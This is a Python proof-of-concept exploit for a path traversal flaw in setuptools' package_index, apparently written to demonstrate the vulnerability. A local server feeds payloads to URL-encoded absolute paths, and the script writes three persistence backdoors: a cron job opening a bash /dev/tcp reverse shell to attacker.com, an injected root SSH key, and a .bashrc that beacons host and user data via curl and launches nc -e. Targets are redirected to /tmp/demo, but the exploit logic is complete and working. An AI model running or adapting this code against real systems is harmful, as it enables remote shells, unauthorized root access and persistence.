#!/usr/bin/env python3
"""
Demonstration of three realistic attack scenarios.

Scenario 1: Cron Job Installation (/etc/cron.d/backdoor)
Scenario 2: SSH Key Injection (~/.ssh/authorized_keys)
Scenario 3: Shell Profile Backdoor (~/.bashrc)

Run: python demo_scenarios.py
"""

import http.server
import os
import socketserver
import sys
import tempfile
import threading
import time
from urllib.parse import quote, unquote

# Ensure setuptools is importable
try:
    from setuptools.package_index import PackageIndex, egg_info_for_url
except ImportError:
    print("ERROR: setuptools not found. Install with: pip install setuptools==78.1.0")
    sys.exit(1)


# =============================================================================
# SCENARIO DEFINITIONS
# =============================================================================

SCENARIOS = [
    {
        "name": "Cron Job Installation",
        "target": "/tmp/demo/etc/cron.d/backdoor",
        "description": "Attacker installs a cron job that runs every minute",
        "payload": b"""# Malicious cron job installed via setuptools path traversal
* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
# This would give attacker a reverse shell every minute
""",
        "impact": "Remote code execution via scheduled task",
    },
    {
        "name": "SSH Key Injection",
        "target": "/tmp/demo/root/.ssh/authorized_keys",
        "description": "Attacker adds their SSH public key for persistent access",
        "payload": b"""# SSH key injected via setuptools path traversal
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDxxxATTACKERKEYxxx attacker@evil.com
# Attacker can now SSH in as root without password
""",
        "impact": "Persistent unauthorized SSH access",
    },
    {
        "name": "Shell Profile Backdoor",
        "target": "/tmp/demo/home/user/.bashrc",
        "description": "Attacker backdoors .bashrc to execute on every new shell",
        "payload": b"""# .bashrc backdoored via setuptools path traversal
# Original .bashrc contents would be here...

# Malicious additions:
curl -s http://attacker.com/beacon?host=$(hostname)&user=$(whoami) &>/dev/null
nohup nc -e /bin/bash attacker.com 4444 &>/dev/null &
# Attacker gets notified and shell access on every login
""",
        "impact": "Code execution on every new shell session",
    },
]


# =============================================================================
# MALICIOUS SERVER
# =============================================================================

class ScenarioServer(http.server.BaseHTTPRequestHandler):
    """HTTP server that serves payloads for each scenario."""

    current_payload = b""

    def log_message(self, *args):
        pass  # Suppress logging

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Length', len(ScenarioServer.current_payload))
        self.end_headers()
        self.wfile.write(ScenarioServer.current_payload)


def start_server():
    """Start HTTP server on random port."""
    server = socketserver.TCPServer(("127.0.0.1", 0), ScenarioServer)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, port


# =============================================================================
# DEMO RUNNER
# =============================================================================

def setup_demo_directories():
    """Create fake system directories for safe demonstration."""
    dirs = [
        "/tmp/demo/etc/cron.d",
        "/tmp/demo/root/.ssh",
        "/tmp/demo/home/user",
    ]
    for d in dirs:
        os.makedirs(d, exist_ok=True)


def cleanup_demo():
    """Remove demo files."""
    import shutil
    if os.path.exists("/tmp/demo"):
        shutil.rmtree("/tmp/demo")


def run_scenario(scenario, server_port):
    """Execute a single attack scenario."""
    target = scenario["target"]
    payload = scenario["payload"]

    # Set the payload the server will serve
    ScenarioServer.current_payload = payload

    # Create malicious URL with encoded absolute path
    encoded_path = quote(target, safe='')
    malicious_url = f"http://127.0.0.1:{server_port}/packages/{encoded_path}"

    # Show the attack
    print(f"    Malicious URL: {malicious_url[:60]}...")
    print(f"    URL decodes to: {target}")

    # Demonstrate the vulnerable code path
    name, _ = egg_info_for_url(malicious_url)
    print(f"    egg_info_for_url() extracts: {name}")

    # Execute the attack
    pi = PackageIndex()
    with tempfile.TemporaryDirectory() as tmpdir:
        print(f"    Legitimate tmpdir: {tmpdir}")
        joined = os.path.join(tmpdir, name)
        print(f"    os.path.join(tmpdir, name) = {joined}")

        # This is the vulnerable call
        result = pi._download_url(malicious_url, tmpdir)
        print(f"    _download_url() returned: {result}")

    # Verify the attack worked
    if os.path.exists(target):
        print(f"\n    [SUCCESS] File written to: {target}")
        return True
    else:
        print(f"\n    [FAILED] File not created at: {target}")
        return False


def main():
    print("=" * 70)
    print("SETUPTOOLS PATH TRAVERSAL - ATTACK SCENARIO DEMONSTRATIONS")
    print("=" * 70)
    print("\nThis demonstrates three realistic attack scenarios that exploit")
    print("the path traversal vulnerability in setuptools package_index.py")
    print("\nNOTE: Using /tmp/demo/* as safe targets instead of real system paths")

    # Setup
    cleanup_demo()
    setup_demo_directories()
    server, port = start_server()
    time.sleep(0.2)

    results = []

    for i, scenario in enumerate(SCENARIOS, 1):
        print(f"\n{'=' * 70}")
        print(f"SCENARIO {i}: {scenario['name']}")
        print("=" * 70)
        print(f"\n  Description: {scenario['description']}")
        print(f"  Target: {scenario['target']}")
        print(f"  Impact: {scenario['impact']}")
        print(f"\n  [EXECUTING ATTACK]")

        success = run_scenario(scenario, port)
        results.append((scenario['name'], success, scenario['target']))

        if success:
            print(f"\n  [FILE CONTENTS]")
            print("  " + "-" * 50)
            with open(scenario['target'], 'r') as f:
                for line in f.read().split('\n'):
                    print(f"  {line}")
            print("  " + "-" * 50)

    # Summary
    print(f"\n{'=' * 70}")
    print("SUMMARY")
    print("=" * 70)

    for name, success, target in results:
        status = "EXPLOITED" if success else "FAILED"
        print(f"  [{status}] {name}")
        print(f"           -> {target}")

    # Show all created files
    print(f"\n  Proof - Files created outside intended directories:")
    os.system("find /tmp/demo -type f 2>/dev/null | head -10")

    print(f"\n{'=' * 70}")
    print("VULNERABILITY CONFIRMED - All scenarios successfully exploited")
    print("=" * 70)

    return 0 if all(r[1] for r in results) else 1


if __name__ == "__main__":
    sys.exit(main())
